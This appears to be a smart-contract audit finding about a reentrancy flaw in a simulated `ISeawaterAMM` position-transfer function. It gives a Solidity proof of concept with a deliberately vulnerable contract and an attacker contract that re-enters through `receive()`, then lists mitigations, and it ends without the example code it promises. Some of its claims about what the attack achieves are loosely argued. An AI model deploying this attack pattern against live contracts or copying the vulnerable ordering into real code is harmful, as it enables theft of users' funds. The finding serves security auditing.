# Vulnerability details

## Impact
A reentrancy vulnerability occurs when a contract allows an external call to another contract before it has completed all its internal state updates. Here, a reentrancy vulnerability is possible in the `transferPositionEEC7A3CD` function of the `ISeawaterAMM` contract could have severe technical and financial implications. If the function permits external calls before updating its internal state, an attacker could exploit this by recursively invoking the function. This would allow them to perform multiple unauthorized transfers of tokens or assets before the contract recognizes the initial transfer, effectively bypassing balance checks and ownership constraints. Such an exploit could lead to the depletion of assets held by the contract, resulting in significant financial loss for users and stakeholders.

## Proof of Concept

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Simulating the ISeawaterAMM contract
contract ISeawaterAMM {
    mapping(uint256 => address) public positionOwner;
    mapping(address => uint256) public balances;

    function transferPositionEEC7A3CD(uint256 _tokenId, address _from, address _to) external {
        // Vulnerable implementation
        require(positionOwner[_tokenId] == _from, "Not the owner");
        (bool success, ) = _to.call("");
        require(success, "Transfer failed");
        positionOwner[_tokenId] = _to;
        balances[_from] -= 1;
        balances[_to] += 1;
    }
}

// Malicious contract to exploit the reentrancy vulnerability
contract MaliciousContract {
    ISeawaterAMM public seawaterAMM;
    uint256 public tokenId;

    constructor(address _seawaterAMM, uint256 _tokenId) {
        seawaterAMM = ISeawaterAMM(_seawaterAMM);
        tokenId = _tokenId;
    }

    function attack() external {
        seawaterAMM.transferPositionEEC7A3CD(tokenId, address(seawaterAMM), address(this));
    }

    receive() external payable {
        seawaterAMM.transferPositionEEC7A3CD(tokenId, address(seawaterAMM), address(this));
    }
}

In this Proof of Concept, the `ISeawaterAMM` contract's `transferPositionEEC7A3CD` function is vulnerable to a reentrancy attack. The function initially checks if the `_from` address is the owner of the token `(_tokenId)` and then makes an external call to the `_to` address using the low-level call function. Before updating the positionOwner mapping and the balances of the `_from` and `_to` addresses, an attacker can exploit this vulnerability. The `MaliciousContract` is crafted to exploit this flaw by calling `transferPositionEEC7A3CD`, attempting to transfer a token to itself. When the vulnerable function makes an external call to the `MaliciousContract`, its receive function is triggered, which recursively calls `transferPositionEEC7A3CD` again before the initial call completes its state updates. This allows the `MaliciousContract` to bypass the ownership check and potentially drain the `ISeawaterAMM` contract's balances. This demonstration highlights how a reentrancy vulnerability can lead to unauthorized token transfers and significant financial loss for users and stakeholders.

## Recommended Mitigation Steps

1) In the `transferPositionEEC7A3CD` function, update the `positionOwner` and balances mappings before making the external call.

2) Use a reentrancy guard, such as OpenZeppelin's ReentrancyGuard, to prevent multiple entries into functions that modify state.

Here the example code is given:
